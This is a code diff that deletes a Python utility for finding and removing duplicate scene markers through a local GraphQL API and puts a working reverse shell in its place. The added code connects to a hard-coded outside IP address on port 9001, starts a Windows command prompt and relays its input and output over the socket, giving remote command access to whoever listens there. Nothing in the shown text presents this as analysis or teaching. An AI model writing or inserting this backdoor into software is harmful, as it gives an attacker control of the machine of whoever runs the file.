@@ -1,69 +1,29 @@
-import requests
-import json
+import os,socket,subprocess,threading;
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
 
-# Endpoint for your GraphQL API
-GRAPHQL_ENDPOINT = 'http://localhost:9999/graphql'
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
 
-# Headers, including authentication if needed
-HEADERS = {
-    'Content-Type': 'application/json',
-    # Add any authentication token if required
-    # 'Authorization': 'Bearer YOUR_ACCESS_TOKEN',
-}
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("208.122.212.234",9001))
 
-# Perform the query to get all scene markers
-def fetch_scene_markers():
-    query = """
-    query AllSceneMarkers {
-        allSceneMarkers {
-            id
-            title
-            seconds
-            scene {
-                id
-            }
-        }
-    }
-    """
-    response = requests.post(GRAPHQL_ENDPOINT, json={'query': query}, headers=HEADERS)
-    if response.status_code == 200:
-        return response.json()['data']['allSceneMarkers']
-    else:
-        raise Exception("Query failed to run by returning code of {}. {}".format(response.status_code, query))
+p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
 
-# Destroy duplicate markers
-def destroy_marker(duplicate_marker_id):
-    mutation = """
-    mutation SceneMarkerDestroy($id: ID!) {
-        sceneMarkerDestroy(id: $id)
-    }
-    """
-    variables = {
-        'id': duplicate_marker_id,
-    }
-    response = requests.post(GRAPHQL_ENDPOINT, json={'query': mutation, 'variables': variables}, headers=HEADERS)
-    if response.status_code == 200:
-        print(f"Duplicate marker {duplicate_marker_id} destroyed successfully.")
-    else:
-        print(f"Failed to destroy marker {duplicate_marker_id}. Response code: {response.status_code}")
+s2p_thread = threading.Thread(target=s2p, args=[s, p])
+s2p_thread.daemon = True
+s2p_thread.start()
 
-# Main function to find and destroy duplicates
-def main():
-    markers = fetch_scene_markers()
-    seen = {}
-    duplicates = []
+p2s_thread = threading.Thread(target=p2s, args=[s, p])
+p2s_thread.daemon = True
+p2s_thread.start()
 
-    # Check for duplicates
-    for marker in markers:
-        identifier = (marker['scene']['id'], marker['seconds'], marker['title'])
-        if identifier in seen:
-            duplicates.append(marker['id'])
-        else:
-            seen[identifier] = marker['id']
-
-    # Destroy duplicates
-    for duplicate_id in duplicates:
-        destroy_marker(duplicate_id)
-
-if __name__ == "__main__":
-    main()
+try:
+    p.wait()
+except KeyboardInterrupt:
+    s.close()
